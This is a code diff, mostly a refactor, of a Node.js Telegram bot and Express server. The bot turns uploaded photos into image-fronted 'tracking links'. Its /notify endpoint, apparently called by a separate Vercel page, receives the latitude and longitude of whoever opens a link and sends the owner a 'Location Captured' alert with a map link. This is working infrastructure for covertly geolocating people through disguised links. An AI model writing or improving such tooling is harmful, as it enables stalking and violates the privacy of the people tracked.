@@ -1,3 +1,6 @@
+const dns = require('dns');
+dns.setDefaultResultOrder('ipv4first');
+
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const { v4: uuidv4 } = require('uuid');
@@ -34,10 +37,7 @@ console.log('🤖 Telegram bot running...');
 ========================= */
 const app = express();
 app.use(express.json());
-app.use(
-  '/uploads',
-  express.static('uploads')
-);
+app.use('/uploads', express.static('uploads'));
 
 /* =========================
    SESSION STORE
@@ -131,14 +131,12 @@ bot.on('photo', async (msg) => {
 
         const fileId = photo.file_id;
 
-        // Get Telegram file path
         const file =
             await bot.getFile(fileId);
 
         const fileUrl =
             `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
 
-        // Save image locally
         const filename =
             `${uuidv4()}.jpg`;
 
@@ -149,11 +147,13 @@ bot.on('photo', async (msg) => {
                 filename
             );
 
+        // ✅ FIXED: timeout + ipv4 fix support
         const response =
             await axios({
                 url: fileUrl,
                 method: 'GET',
-                responseType: 'stream'
+                responseType: 'stream',
+                timeout: 30000
             });
 
         const writer =
@@ -163,36 +163,24 @@ bot.on('photo', async (msg) => {
 
         await new Promise(
             (resolve, reject) => {
-                writer.on(
-                    'finish',
-                    resolve
-                );
-                writer.on(
-                    'error',
-                    reject
-                );
+                writer.on('finish', resolve);
+                writer.on('error', reject);
             }
         );
 
-        // Generate link
         const linkId = uuidv4();
 
         const trackingLink =
             `${BASE_URL}/t/${linkId}`;
 
-        // Save metadata
         saveLink({
             linkId,
-            ownerName:
-                session.name,
-            telegramUsername:
-                session.telegramUsername,
-            ownerChatId:
-                chatId,
+            ownerName: session.name,
+            telegramUsername: session.telegramUsername,
+            ownerChatId: chatId,
             thumbnail:
                 `http://${VPS_IP}:5000/uploads/${filename}`,
-            createdAt:
-                new Date().toISOString()
+            createdAt: new Date().toISOString()
         });
 
         bot.sendMessage(
@@ -203,7 +191,10 @@ bot.on('photo', async (msg) => {
         delete userSessions[chatId];
 
     } catch (err) {
-        console.error(err);
+        console.error(
+            'Image processing failed:',
+            err.message
+        );
 
         bot.sendMessage(
             chatId,
@@ -212,7 +203,9 @@ bot.on('photo', async (msg) => {
     }
 });
 
-//get link id 
+/* =========================
+   GET LINK (VPS API)
+========================= */
 app.get('/links/:id', (req, res) => {
     const links = getLinks();
 
@@ -230,24 +223,17 @@ app.get('/links/:id', (req, res) => {
 });
 
 /* =========================
-   LOCATION NOTIFICATION API
-   Called by Vercel server
+   NOTIFY API (FROM VERCEL)
 ========================= */
 app.post('/notify', async (req, res) => {
     try {
         const apiKey =
             req.headers['x-api-key'];
 
-        if (
-            apiKey !==
-            NOTIFY_API_KEY
-        ) {
-            return res
-                .status(401)
-                .json({
-                    error:
-                        'Unauthorized'
-                });
+        if (apiKey !== NOTIFY_API_KEY) {
+            return res.status(401).json({
+                error: 'Unauthorized'
+            });
         }
 
         const {
@@ -260,31 +246,13 @@ app.post('/notify', async (req, res) => {
         const mapLink =
             `https://maps.google.com/?q=${latitude},${longitude}`;
 
-        console.log(
-            '========================'
-        );
-        console.log(
-            '📍 LOCATION ALERT'
-        );
-        console.log(
-            'Owner:',
-            ownerName
-        );
-        console.log(
-            'Latitude:',
-            latitude
-        );
-        console.log(
-            'Longitude:',
-            longitude
-        );
-        console.log(
-            'Map:',
-            mapLink
-        );
-        console.log(
-            '========================'
-        );
+        console.log('========================');
+        console.log('📍 LOCATION ALERT');
+        console.log('Owner:', ownerName);
+        console.log('Latitude:', latitude);
+        console.log('Longitude:', longitude);
+        console.log('Map:', mapLink);
+        console.log('========================');
 
         const message = `
 🚨 Location Captured
@@ -317,26 +285,20 @@ ${mapLink}
 });
 
 /* =========================
-   START EXPRESS SERVER
+   START SERVER
 ========================= */
-app.listen(
-    BOT_API_PORT,
-    () => {
-        console.log(
-            `🌐 Notify API running on port ${BOT_API_PORT}`
-        );
-    }
-);
+app.listen(BOT_API_PORT, () => {
+    console.log(
+        `🌐 Notify API running on port ${BOT_API_PORT}`
+    );
+});
 
 /* =========================
    POLLING ERROR
 ========================= */
-bot.on(
-    'polling_error',
-    (error) => {
-        console.log(
-            'Polling Error:',
-            error.message
-        );
-    }
-);
+bot.on('polling_error', (error) => {
+    console.error(
+        'Polling Error:',
+        error.message
+    );
+});
